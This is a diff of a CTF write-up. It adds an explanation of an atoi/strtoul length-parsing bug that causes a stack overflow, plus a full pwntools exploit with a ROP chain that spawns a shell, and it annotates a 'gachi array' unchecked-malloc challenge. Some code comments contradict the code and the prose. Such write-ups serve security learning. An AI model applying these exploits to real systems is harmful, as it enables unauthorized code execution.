@@ -22,12 +22,95 @@ This is gotta be brief but will refine it later.
 
 Completed with dylanyang17.
 
-We overwrite the lowest byte of the destination of memcpy to bypass the canary and overwrite the return address to a ROP chain.
+The vulnerability is a classic atoi/strtoul inconsistency bug. The length string is parsed with atoi (base 10) while the allocation size is parsed with strtoul (base 8). Therefore, if we send a length string starting with '0', it will be interpreted as octal by strtoul, causing a smaller allocation than intended. Therefore, we can overflow the stack via alloca.
+
+Part of the stack layout and code is like this
+
+```c
+char tmp_buf_0[8]; // [rsp+8h] [rbp-70h] BYREF
+unsigned __int64 size_1; // [rsp+10h] [rbp-68h]
+__int64 buf_1; // [rsp+18h] [rbp-60h]
+
+for ( j = 0; j < sz; ++j )
+  {
+    if ( (unsigned int)_isoc99_fscanf(
+                         fp_1,
+                         (unsigned int)"%02hhx",
+                         (int)j + (int)tmp_buf,
+                         (unsigned int)"%02hhx",
+                         v6,
+                         v7,
+                         tmp_buf_0[0]) != 1 )
+      return -1;
+  }
+
+  j_memcpy(buf_1, tmp_buf, sz);
+
+```
+
+We overwrite the lowest byte of the destination of memcpy(buf_1 in the code above) to bypass the canary and overwrite the return address to a ROP chain.
 
 This exploit script is produced by dylanyang17. Will try to reconstruct it later.
 
 ### exp
-TODO
+```py
+from pwn import *
+
+# Simple PoC for the unserialize length/alloca bug.
+# It sends a crafted length string that is interpreted differently
+# by atoi/strtoul(base=10) vs strtoul(base=0), causing a stack overflow.
+
+context.binary = ELF("./chall", checksec=False)
+context.log_level = "debug"  # change to "info" or "error" if too noisy
+
+
+LEN_DEC = 113
+LEN_STR = f"0{LEN_DEC}"  # "0256"
+
+assert LEN_STR.isdigit() and LEN_STR[0] == "0"
+
+# Build the body: 100 bytes of 'A' to clearly smash the stack
+pop_rax_ret = 0x004303ab
+pop_rdi_rbp_ret = 0x0402418
+syscall = 0x042849F
+pop_rsi_ret = 0x43617e
+pop_rdx_ret = 0x04866ec # 0x00000000004866ec : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
+store = 0x42F785 # mov [rsi], rax ; ret
+binshell = 0x04CCC60
+
+rop = p64(pop_rax_ret) + p64(0x68732f6e69622f) + p64(pop_rsi_ret) + p64(binshell) + p64(store) + p64(pop_rdi_rbp_ret) + p64(binshell) + p64(0) + p64(pop_rsi_ret) + p64(0) + p64(pop_rax_ret) + p64(59) + p64(syscall)
+# c: 1 e: 2 6: 2 d: 1 4: 1 a: 1
+body = rop.ljust(0x70, b"\x00") + p8(0x78)
+body_hex = body.hex()
+
+# The program expects: "<len_dec_digits>:<len bytes as %02hhx>"
+prefix = (LEN_STR + ":").encode()
+payload = prefix + body_hex.encode()
+
+
+def start_io(local=True, host=None, port=None):
+    if local:
+        return process(context.binary.path)
+    assert host is not None and port is not None
+    return remote(host, port)
+
+
+def main():
+    # Set local=False and fill host/port to hit remote
+    io = start_io(local=True)
+
+    # Send the serialized blob; no extra newline required but harmless
+    io.send(payload + b"\n")
+
+    # With this PoC you should see a crash (SIGSEGV) due to
+    # stack corruption from the alloca overflow.
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+
+```
 
 ## gachi array
 
@@ -36,6 +119,7 @@ The classic interger overflow. Also malloc without the return value check and in
 ### vuln
 
 The array's init function is like this:
+
 ```c
 void array_init(pkt_t *pkt) {
   if (pkt->size > pkt->capacity)
@@ -43,7 +127,7 @@ void array_init(pkt_t *pkt) {
 
   g_array.data = (int*)malloc(pkt->capacity * sizeof(int));
   if (!g_array.data)
-    *(uint64_t*)pkt = 0;
+    *(uint64_t*)pkt = 0; // this is where pkt->capacity locates
 
   g_array.size = pkt->size;
   g_array.capacity = pkt->capacity;
@@ -56,9 +140,12 @@ void array_init(pkt_t *pkt) {
 }
 ```
 
+If the allocation failed (`g_array.data == NULL`), according to the source code, the capacity should be set to zero by `*(uint64_t*)pkt = 0`.
+
 However, when looking at the decompiled code, part of it looks like this:
+
 ```c
-  v1 = *pkt;
+  v1 = *pkt; // both pkt->size and pkt->capacity are read to v1
   if ( pkt[1] > *pkt )
     pkt[1] = v1;
   data = (__int64)malloc(4LL * v1);
@@ -68,19 +155,20 @@ However, when looking at the decompiled code, part of it looks like this:
   size = pkt[1];
   initial = pkt[2];
   initial_1 = initial;
-  g_array = _mm_unpacklo_epi32(_mm_cvtsi32_si128(size), _mm_cvtsi32_si128(v1)).m128i_u64[0];
+  g_array = _mm_unpacklo_epi32(_mm_cvtsi32_si128(size), _mm_cvtsi32_si128(v1)).m128i_u64[0]; // original pkt->capacity copied to g_array
 ```
 
-We can easily see that EVEN IF malloc fails, the size will be set to 0 but **capacity is still set to the user controlled value**. This means we can set a very large capacity, make malloc fail, and then assign the `g_array.capacity` to a very big number.
+We can easily see that EVEN IF malloc fails, the size will be set to 0 but **capacity is still set to the user controlled value of the initial `pkt->capacity`**. This means we can set a very large capacity, make malloc fail, and then assign the `g_array.capacity` to a very big number.
 
 ```py
 p.send(p32(0xffffffff) + p32(3) + p32(0))
 ```
+
 such is the poc to achieve this.
 
-From past challenges, we know that if we have non-checked malloc and index, we can achieve arbitrary read/write. See the [bph writeup](https://blog.rosay.xyz/qwb-2025-writeup/) here.
+From past challenges, we know that if we have unchecked malloc and index, we can achieve arbitrary read/write. See the [bph writeup](https://blog.rosay.xyz/qwb-2025-writeup/) here.
 
-Therefore, to get this non-checked index, we should use the resize functionality to set size to a very large number (negative number interpreted as a large unsigned number).
+Therefore, to get this unchecked index, we should use the resize functionality to set size to a very large number (negative number interpreted as a large unsigned number).
 
 ```py
 p.send(p32(0xffffffff) + p32(3) + p32(0))
@@ -113,6 +201,7 @@ log.info(f"libc base: {hex(libc_base)}")
 Finally, we exploit using house of apple 2 and it is done.
 
 ### exp
+
 ```py
 from pwn import *
 context(log_level='debug', arch='amd64', os='linux')
@@ -501,6 +590,7 @@ if __name__ == "__main__":
 ### exp
 
 The script below can work in local and docker but not remote.
+
 ```py
 
 from pwn import *
@@ -621,6 +711,7 @@ if __name__ == "__main__":
 ```
 
 The final script that can work on remote, written by jiegec. The change is to leak the libc address from `__libc_start_main` instead of `memmove@got`:
+
 ```py
 from pwn import *
 
